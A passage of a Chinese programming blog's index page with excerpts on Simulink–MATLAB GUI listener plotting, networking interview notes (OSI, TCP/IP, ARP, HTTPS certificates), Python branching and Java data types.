	<div class="content list__excerpt post__content clearfix">
		simulink与matlab-GUI通信：实时绘制曲线 本文主要采用了监听器的方法来进行simulink和GUI进行通信，采用get_params和set_params进行实时获取数据和修改参数，监听器可以设置一个也可以设置多个。
步骤如下：
1.在simulink中右击，选择ModelProperties.
2.选择callbacks中的startFcn,此时右侧代码区为空白。
3.添加代码
set(0,'ShowHiddenHandles','on'); blk='DNMPC/position1'; event='PostOutputs'; listener=@hhh; h=add_exec_event_listener(blk,event,listener); 这里的
blk=‘simulink_name/模块_name’
event有很多参数，这里的’PostOutputs‘意思是监听模块的输出。
listener是监听函数
最后add_exec_event_listener生成监听器
具体的用法可以help add_exec_event_listener,结果如下：
4.在matlab-GUI中的****_OpeningFcn写入
guidata(hObject, handles); load_system('DNMPC'); line_p1 = line('Parent',handles.axes1,... 'XData',[],... 'YData',[],... 'Color','blue',... 'EraseMode','xor',... 'Tag','line_p1') line_p2 = line('Parent',handles.axes1,... 'XData',[],... 'YData',[],... 'Color','red',... 'EraseMode','xor',... 'Tag','line_p2') line_p1、line_p2是创建了一个绘图对象，画两张图
5.在matlab-GUI中创建监听函数
function hhh(block,eventdata) hf = findall(0,'Tag','figure1'); ax = findall(hf,'Tag','axes1'); title(ax,'位置图'); thisLineHandle1 = findall(hf,'Tag','line_p1'); xdata1 = get(thisLineHandle1,'XData'); ydata1 = get(thisLineHandle1,'YData'); sTime1 = block.CurrentTime; data1 =block.OutputPort(1).Data; if length(xdata1) &lt; 100001 newXData1 = [xdata1 sTime1]; newYData1 = [ydata1 data1]; else newXData1 = [xdata1(2:end) sTime1]; newYData1 = [ydata1(2:end) data1]; end set(thisLineHandle1,.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a9cd7407c8ab48e10714cc88d42096e6/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3e4eac50876ab8a4b80ba1375bb9231c/" rel="bookmark">
			计算机网络面试准备
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 1.计算机网络模型1. OSI七层模型2.TCP/IP模型 2.网络层1.IP地址与物理地址2.ARP地址解析协议的工作原理3.**RARP逆地址解析协议：**4.DHCP协议5.ICMP协议，因特网控制报文协议6.交换机与路由器的区别7.路由选择协议 3.传输层一、TCP和UDP1. 传输控制协议TCP和用户数据报协议UDP的区别2.TCP和UDP的适用场景3.TCP的首部字段 二、TCP连接的建立与断开1、建立连接的三次握手2.为什么不能用两次握手进行建立连接3.断开连接的四次挥手4.为什么需要TIME_WAIT状态（为什么还要等待2MSL）5.为什么需要四次挥手6.如果已经建立了连接，但是客户端突然出现故障了怎么办？7.什么是SYN洪泛8.三次握手过程中对否可以携带数据9.TCP的粘包和拆包9.1什么是粘包拆包9.2什么情况会发生拆包粘包9.3拆包粘包问题的解决策略9.4网络层-IP数据报分片 10.TCP的长连接和短连接11. seq初始序列号是固定的吗12.为什么建立连接是三次握手，关闭连接却是四次挥手 三、TCP可靠性传输1.TCP如何保证可靠性传输2.TCP的流量控制3.TCP的拥塞控制4.拥塞控制和流量控制的差别 四、UDP如何保证可靠传输五、停止等待协议、连续ARQ协议、滑动窗口协议、流量控制（慢开始、拥塞避免、快重传、快恢复） 4.应用层一、http协议1.cookie和session的区别2.一个完整的http请求是怎么样？即从输入网址到获得页面的过程3.http的长连接和短连接4.http的断点续传是如何实现的？5.http存在的问题6.URL7.URI和URL的区别是什么8.http1.0、http1.1、http2.0主要特点9.http2.0的多路复用和http1.x中的长连接复用有什么区别 二、https协议1、https的认证加密过程？如何保证内容不会被篡改的？2、根证书如何保证签发的证书是安全有效的？3、为什么需要CA证书认证机构呢？4、SSL/TLS当举报人手上的公钥被恶意替换成某诈骗公司的公钥之后，诈骗公司就可以伪装成检举机构和举报人通信而不被发现，因为诈骗公司本身就拥有自己的私钥，而且把举报人的公钥替换成了自己的公钥，而举报人根本发现不了，还以为自己跟检举机构安全保密的通信呢。证书中心（certificate authority，简称CA）用自己的私钥，检举机构的公钥和一些相关信息一起加密，生成"数字证书"（Digital Certificate）。数字证书保证了检举机构和对应公钥的匹配性扩展：有的朋友就说了，那如果CA的公钥被替换了怎么办？有兴趣的朋友可以去了解一下这种情况，称为中间人攻击，既黑客组织同时冒充服务端和客户端进行双向伪装通信 三、http的请求与响应**1、http的常见请求方式：**2、**get和 post 请求的区别：**3、**http报文头分析：****4、Http 常见的状态码**：5、http1.0和http1.1的主要区别是什么**6、http/1.x和http/2.0的区别：****7、http 和 https 的区别、https的实现过程** 四、应用层其他相关的协议： 5.各层的网络设备，对应的协议一、各层设备二、各层协议 杂记1.网络层路由选择协议2.各层协议3.DHCP协议详解4.ICMP协议5.路由选择协议6.IGMP 网际组管理协议7.TCP协议8.Session和Cookie的详解和区别使用9.HTTP10.SSL/TSL8.Session和Cookie的详解和区别使用9.HTTP10.SSL/TSL 1.计算机网络模型 TCP/IP 与 OSI 都是为了使网络中的两台计算机能够互相连接并实现通信与回应，但他们最大的不同在于，OSI 是一个理论上的网络通信模型，而 TCP/IP 则是实际上的网络通信标准。
1. OSI七层模型 物理层：实现计算机节点之间比特流的透明传输，规定传输媒体接口的标准，屏蔽掉具体传输介质和物理设备的差异，使数据链路层不必关心网络的具体传输介质，按照物理层规定的标准传输数据就行。
数据链路层：通过差错控制、流量控制等方法，使有差错的物理线路变为无差错的数据链路。
数据链路层的几个基本方法：数据封装成桢、透明传输、差错控制、流量控制。
封装成桢：把网络层数据报加头和尾，封装成帧，帧头中包括源MAC地址和目的MAC地址。
透明传输：是指不管所传数据是什么样的比特组合，都应当能够在链路上传送。因此，链路层就“看不见”有什么妨碍数据传输的东西。常见方法：零比特填充、转义字符、字节填充。
差错控制：接收者检测错误,如果发现差错，丢弃该帧，差错控制方法有 CRC 循环冗余码、奇偶校验码、海明码。
流量控制：控制发送的传输速度，使得接收方来得及接收。传输层TCP也有流量控制功能，但TCP是端到端的流量控制，链路层是点到点（比如一个路由器到下一个路由器）
网络层：实现网络地址与物理地址的转换，并通过路由选择算法为分组通过通信子网选择最适当的路径
网络层最重要的一个功能就是：路由选择。路由一般包括路由表和路由算法两个方面。每个路由器都必须建立和维护自身的路由表，一种是静态维护，也就是人工设置，适用于小型网络；另一种就是动态维护，是在运行过程中根据网络情况自动地动态维护路由表。
传输层：提供源端与目的端之间提供可靠的透明数据传输，传输层协议为不同主机上运行的进程提供逻辑通信。负责向两台主机进程之间的通信提供通用的数据传输服务(TCP、UDP)，（网关）。
网络层协议负责的是提供主机间的逻辑通信；传输层协议负责的是提供进程间的逻辑通信。 会话层：管理主机之间的会话进程，负责在网络中的两节点之间建立、维持、终止通信。
表示层：处理用户数据的表示问题，如数据的编码、格式转换、加密和解密、压缩和解压缩。
应用层：为用户的应用进程提供网络通信服务，完成和实现用户请求的各种服务。
2.TCP/IP模型 TCP/IP协议模型（Transmission Control Protocol/Internet Protocol），包含了一系列构成互联网基础的网络协议，是Internet的核心协议。TCP/IP协议族按照层次由上到下，层层包装。
上图表示了TCP/IP协议中每个层的作用，而TCP/IP协议通信的过程其实就对应着数据入栈与出栈的过程。入栈的过程，数据发送方每层不断地封装首部与尾部，添加一些传输的信息，确保能传输到目的地。出栈的过程，数据接收方每层不断地拆除首部与尾部，得到最终传输的数据。
2.网络层 实现网络地址与物理地址的转换，并通过路由选择算法为分组通过通信子网选择最适当的路径
1.IP地址与物理地址 物理地址是数据链路层和物理层使用的地址，IP地址是网络层和以上各层使用的地址，是一种逻辑地址，其中ARP协议将IP地址转换成物理地址。
2.ARP地址解析协议的工作原理 ARP 是根据 IP 地址获取 MAC 地址的一种协议，核心原理就是广播发送ARP请求，单播发送ARP响应
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/3e4eac50876ab8a4b80ba1375bb9231c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b3c458905b2e84b67b82b01e75a62cf0/" rel="bookmark">
			Python零基础入门之第三章 Python分支结构
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		第三章 Python分支结构 分享最近经常听说的一句话‘今天是你最年轻的一天’，所以趁年轻，冲吧! 总想着明天开始，其实有多少人能做得到呢？但是现在开始，即使明天放弃，那也比那些还没开始的人强的多。
总目录简介 一、单分支
二、双分支
三、多分支
四、分支的嵌套
五、其他备注事项
人生路上，总会遇到不同的条件，你可以选择不同的条件去走不同的路，有时候只有一条，有时候有多种选择。分支结构也是类似的。
一、单分支
单分支结构：满足判断条件（满足为真，不满足为假），就会执行语句块的内容。
格式：
if &lt;判断条件&gt;: &lt;语句块&gt; 二、双分支
多分支结构：满足判断条件，就会执行语句块1的内容，如果不满足判断条件，就会执行else后的语句块2。
格式：
if &lt;判断条件&gt;: &lt;语句块1&gt; else: &lt;语句块2&gt; 三、多分支
多分支结构：满足对应的判断条件，就会执行对应语句块的内容，逐级判断，如果不满足所有判断条件，就执行最后一个语句块，else语句是可选的。
格式：
if &lt;判断条件&gt;: &lt;语句块1&gt; elif: &lt;语句块2&gt; elif: &lt;语句块3&gt; elif: &lt;语句块x&gt; else: &lt;语句块last&gt; 四、分支结构的嵌套
层层递进的判断，可以多层判断，分支里面嵌套分支结构，注意缩进，确定从属关系。
格式：
if &lt;判断条件&gt;: if &lt;判断条件&gt;: &lt;语句块1&gt; else: &lt;语句块2&gt; 注意：冒号要加，并且要在英文状态下。
五、其他备注事项
（1）判断的条件有真(True)有假(False)，条件为假可以是数字零（0，0.0），还可以是空的数据结构（空列表、空字典、空字符串、空集合等）
（2）判断条件中还有些常用的运算符（in 包含，not in 不包含）
（3）多分支结构中，只有一个条件满足并执行
（4）判断条件可以是逻辑/关系/算数表达式等
（5）语句块注意从属结构，属于的要加4个空格来区分
小测试：闰年的判断
普通年能被4整除且不能被100整除的为闰年.世纪年能被400整除的是闰年。
#方法一 year = int(input('请输入一个年份')) if (year % 4 == 0 and year % 100 !
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b3c458905b2e84b67b82b01e75a62cf0/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/951e4393b11924ebf28b16aa3f662fd4/" rel="bookmark">
			5、JAVA数据类型
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		5、JAVA数据类型 5.1 基本数据类型 数值型 整数类型：byte (1)，short (2), int (4), long (8) (括号内数字表示字节）浮点类型：float (4)，double (8) （浮点数=符号位+指数位+尾数位） 字符型 ： char （2）布尔型：boolean (1) true,false 5.2 引用数据类型 类接口数组 5.3 基本数据类型转换 自动类型转换：
char–&gt;int–&gt;long–&gt;float–&gt;double
byte–&gt;short–&gt;int–&gt;long–&gt;float–&gt;double
java进行运算或赋值时，精度小的自动转换为精度最大的数据类型
byte,short和char之间不会相互自动转换，但是三者可以计算，计算时自动转换为int类型
把具体数赋值给byte时，先判断该数是否在byte范围内，如果是就可以
Boolean 不参与运算转换
强制类型转换（会造成精度损失）
数据精度从大到小转换时，用强制类型转换
5.4 基本类型和String转换 基本数据类型==&gt;String: 在基本数据类型后+“”即可
String==&gt;基本数据类型： 基本数据类型对应的包装类的相应方法，得到转换后的基本数据类型
有效的字符串才能转换，若字符串s=“abc”,则转换为基本数据类型会抛出异常 补充： byte为基本存储单元，bit为最小存储单元，1 byte = 8 bit
声明long 类型要加l或L，如：long a = 0910L;
java 浮点型常量（具体值）默认为double,所以如：float b = 3.14;是错误的，即声明float类型要加f或F，如：float b = 3.14f；
5.12e2表示5.12乘10的2次方；5.12e-2表示5.12乘10的-2次方
对运算结果是小数进行相等判断时要注意使用它们差值的绝对值在某个精度的范围内进行判断
如：double num1 = 2.7; double num2 = 8.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/951e4393b11924ebf28b16aa3f662fd4/">Read more…</a>
	</div>
</article>
</main>

<div class="pagination">
	<a class="pagination__item pagination__item--prev btn" href="/posts/page/249/">«</a>
	<span class="pagination__item pagination__item--current">250/489</span>
	<a class="pagination__item pagination__item--next btn" href="/posts/page/251/">»</a>
</div>

			</div>
			

		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 菜鸟程序员博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<div id="gafoot"></div>
<script src="https://101121.xyz/ga/app.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>